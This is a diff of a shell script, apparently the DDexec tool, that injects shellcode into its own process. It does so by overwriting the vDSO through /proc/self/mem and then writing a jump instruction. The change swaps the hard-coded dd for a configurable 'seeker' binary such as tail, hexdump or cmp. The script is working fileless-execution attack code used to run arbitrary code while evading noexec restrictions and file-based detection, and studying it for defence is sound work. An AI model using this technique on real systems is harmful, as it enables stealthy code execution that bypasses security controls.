@@ -1,14 +1,17 @@
 #!/bin/sh
 
-filename=/bin/dd
-
 # Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
-# Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'
+# Then in gdb just use `set $pc+=2' and you will be able to `si'.
+# In ARM64 use `set $pc+=4'.
 if [ -z "$DEBUG" ]; then DEBUG=0; fi
 
-# If /bin/dd is not executable by your user you may try to run it through the
-# the loader (typically ld).
+# If the seeker binary is not executable by your user, you may try to run it
+# through the loader (typically ld.so).
 if [ -z "$USE_INTERP" ]; then USE_INTERP=0; fi
+
+# Currently tail is the default binary used to lseek() through the mem file.
+if [ -z "$SEEKER" ]; then seeker=tail; else seeker="$SEEKER"; fi
+seeker=$(command -v "$seeker") # Harry Potter vibes? Nah.
 
 # Endian conversion
 endian()
@@ -140,15 +143,15 @@ then
     setopt KSH_ARRAYS
 fi
 
-# Interpreter (loader) for dd
+# Interpreter (loader) for our seeker
 if [ $USE_INTERP -eq 1 ]
 then
-    interp_off=$(search_section $filename .interp)
+    interp_off=$(search_section $seeker .interp)
     if [ -n "interp_off" ]
     then
         interp_size=$(echo $interp_off | cut -d' ' -f2)
         interp_off=$(echo $interp_off | cut -d' ' -f1)
-        interp_=$(tail -c +$(($interp_off + 1)) $filename |\
+        interp_=$(tail -c +$(($interp_off + 1)) $seeker |\
                   head -c $((interp_size - 1)))
     fi
 fi
@@ -170,9 +173,39 @@ jmp=$(printf $jmp | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 read syscall_info < /proc/self/syscall
 addr=$(($(echo $syscall_info | cut -d' ' -f9)))
 exec 3>/proc/self/mem
-# Write the shellcode
-printf $sc  | $interp_ $filename bs=1 seek=$vdso_addr >&3 2>/dev/null
+
+# Arguments' format for the chosen seeker
+if [ -z "$SEEKER_ARGS" ]
+then
+    if [ $(basename $seeker) = "tail" ]
+    then
+        SEEKER_ARGS='-c +$(($offset + 1))'
+    elif   [ $(basename $seeker) = "dd" ]
+    then
+        SEEKER_ARGS='bs=1 skip=$offset'
+    elif [ $(basename $seeker) = "hexdump" ]
+    then
+        SEEKER_ARGS='-s $offset'
+    elif [ $(basename $seeker) = "cmp" ]
+    then
+        SEEKER_ARGS='-i $offset /dev/null'
+    else
+        echo "DDexec: Unknown seeker. Provide its arguments in SEEKER_ARGS."
+        exit 1
+    fi
+fi
+
+# Overwrite vDSO with our shellcode
+seeker_args=${SEEKER_ARGS/'$offset'/$vdso_addr}
+seeker_args="$(eval echo -n \"$seeker_args\")"
+$interp_ $seeker $seeker_args <&3 >/dev/null 2>&1
+printf $sc >&3
+
 exec 3>&-
 exec 3>/proc/self/mem
-# Have fun!
-printf $jmp | $interp_ $filename bs=1 seek=$addr      >&3 2>/dev/null
+
+# Write jump instruction somewhere it will be found shortly
+seeker_args=${SEEKER_ARGS/'$offset'/$addr}
+seeker_args="$(eval echo -n \"$seeker_args\")"
+$interp_ $seeker $seeker_args <&3 >/dev/null 2>&1
+printf $jmp >&3 # The shell doesn't know this command is gonna kill it
